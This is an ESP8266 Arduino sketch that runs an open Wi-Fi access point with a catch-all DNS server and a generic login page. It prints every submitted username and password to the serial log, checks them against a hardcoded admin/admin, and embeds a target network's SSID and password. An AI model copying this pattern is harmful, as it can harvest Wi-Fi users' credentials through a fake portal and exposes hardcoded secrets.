#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>

ESP8266WebServer server(80);
DNSServer dnsServer;  // Create a DNS server instance

const char* ssid = "WiFi";
const char* password = "";

const char* ssid_target = "PEARLHOME1";
const char* password_target = "mutiara2166";

std::vector<String> authenticatedDevices;

void setup() {
  Serial.begin(115200);
  ap();
}

void ap(){
  WiFi.begin(ssid_target, password_target);
  
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.println("Connecting to target WiFi...");
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid, password);
  IPAddress apIP = WiFi.softAPIP();
  dnsServer.start(53, "*", apIP);
  server.on("/", HTTP_GET, handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.begin();
  server.onNotFound([]() {
    server.sendHeader("Location", String("/"), true);
    server.send(302, "text/plain", "Redirecting to the root page...");
  });
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}

void handleRoot() {
  String loginPage =
    "<html>"
    "<head>"
    "<style>"
    "body {"
    "  font-family: Arial, Helvetica, sans-serif;"
    "  background-color: #f2f2f2;"
    "  text-align: center;"
    "}"
    ".container {"
    "  background-color: #ffffff;"
    "  border-radius: 10px;"
    "  padding: 20px;"
    "  margin: 0 auto;"
    "  width: 300px;"
    "  margin-top: 100px;"
    "}"
    "input[type=text], input[type=password] {"
    "  width: 100%;"
    "  padding: 12px 20px;"
    "  margin: 8px 0;"
    "  display: inline-block;"
    "  border: 1px solid #ccc;"
    "  box-sizing: border-box;"
    "}"
    "button {"
    "  background-color: #4CAF50;"
    "  color: white;"
    "  padding: 14px 20px;"
    "  margin: 10px 0;"
    "  border: none;"
    "  cursor: pointer;"
    "  width: 100%;"
    "}"
    "button:hover {"
    "  opacity: 0.8;"
    "}"
    "</style>"
    "</head>"
    "<body>"
    "<div class='container'>"
    "<h1>Login Page</h1>"
    "<form action='/login' method='post'>"
    "<label for='username'><b>Username</b></label>"
    "<input type='text' placeholder='Enter Username' name='username' required>"
    "<br>"
    "<label for='password'><b>Password</b></label>"
    "<input type='password' placeholder='Enter Password' name='password' required>"
    "<br>"
    "<button type='submit'>Login</button>"
    "</form>"
    "</div>"
    "</body>"
    "</html>";
  server.send(200, "text/html", loginPage);
}

void handleLogin() {
  String username = server.arg("username");
  String password = server.arg("password");

  Serial.println("Username: " + username);
  Serial.println("Password: " + password);

  if (username == "admin" && password == "admin") {
    authenticatedDevices.push_back(server.client().remoteIP().toString());
    server.send(200, "text/plain", "Login success");
  } else {
    server.send(401, "text/plain", "Authentication failed");
  }
}

bool isAuthenticated(IPAddress clientIP) {
  for (const auto& device : authenticatedDevices) {
    if (clientIP.toString() == device) {
      return true;
    }
  }
  return false;
}
